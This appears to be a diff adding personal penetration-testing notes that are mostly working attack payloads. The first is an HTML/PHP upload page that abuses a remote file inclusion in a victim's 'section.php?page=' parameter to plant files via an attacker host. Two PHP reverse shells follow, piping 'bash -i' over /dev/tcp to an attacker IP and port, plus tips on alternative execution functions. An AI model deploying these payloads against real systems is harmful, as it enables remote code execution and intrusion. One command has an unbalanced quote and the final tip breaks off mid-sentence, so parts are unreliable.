@@ -1,0 +1,21 @@
+Upload file page:
+<!DOCTYPE html> <html> <head>   <title>Upload your files</title> </head> <body>   <form enctype="multipart/form-data" action="http://<VICTIM IP>/section.php?page=http://<ATTACKING IP>:8000/upload.php" method="POST">     <p>Upload your file</p>     <input type="file" name="uploaded_file"></input><br />     <input type="submit" value="Upload"></input>   </form> </body> </html> <?PHP   if(!empty($_FILES['uploaded_file']))   {     $path = "<VICTIM DIR FOR FILES>";     $path = $path . basename( $_FILES['uploaded_file']['name']);      if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {       echo "The file ".  basename( $_FILES['uploaded_file']['name']).        " has been uploaded";     } else{         echo "There was an error uploading the file, please try again!";     }   } ?>
+---
+Reverse shells:
+<html>
+  <h1>test</h1>
+  <?php
+    $output = `/bin/bash -c 'bash -i > /dev/tcp/<ATTACKER IP>/<ATTACKER PORT> 0>&1'`;
+    // may need to test different forms of bash reverse shells and will be obviously different for Windows
+    echo "<pre>$output</pre>";
+  ?>
+</html>
+
+<html>
+  <h1>test</h1>
+  <?php system("/bin/bash -c 'bash -i > /dev/tcp/192.168.119.218/80 0>&1"); ?> // also shell_exec|exec|popen and probably more
+</html>
+
+Sometimes trial and error is needed to execute system commands- when system and other functions don't work, the use of the backtick execution operator might
+  Ensure PHP can execute beforehand via a simple echo statement <?php echo("hi!"); ?>
+---
